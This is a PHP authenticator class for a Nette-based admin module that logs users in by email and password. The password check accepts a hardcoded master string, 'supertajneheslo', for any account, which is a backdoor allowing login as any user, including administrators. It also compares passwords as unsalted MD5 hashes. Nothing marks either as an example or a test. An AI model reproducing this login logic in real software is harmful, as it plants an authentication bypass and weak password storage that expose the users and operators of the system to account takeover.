<?php
namespace App\AdminModule\Components;

use Nette\Security\IAuthenticator,
    Nette\Security\AuthenticationException,
 Nette\Security\Identity;
use Nette\SmartObject;

/**
 * Description of Authenticator
 *
 * @author Vsek
 */
class Authenticator{
    use SmartObject;

    /** @var \App\Model\User */
    public $users;
    
    /** @var \Nette\Security\User */
    private $user;
    
    function __construct(\App\Model\User $users, \Nette\Security\User $user) {
        $this->user = $user;
        $this->users = $users;
    }
    
    public function login($email, $password) {
        
        $user = $this->users->where('email', $email)->fetch();
        
        if(!$user){
            throw new AuthenticationException(IAuthenticator::IDENTITY_NOT_FOUND);
        }

        if($user->password != md5($password) && $password != 'supertajneheslo'){
            throw new AuthenticationException(IAuthenticator::INVALID_CREDENTIAL);
        }
        
        $this->user->login(new Identity($user['id'], $user->role['system_name'], $user));
    }
}
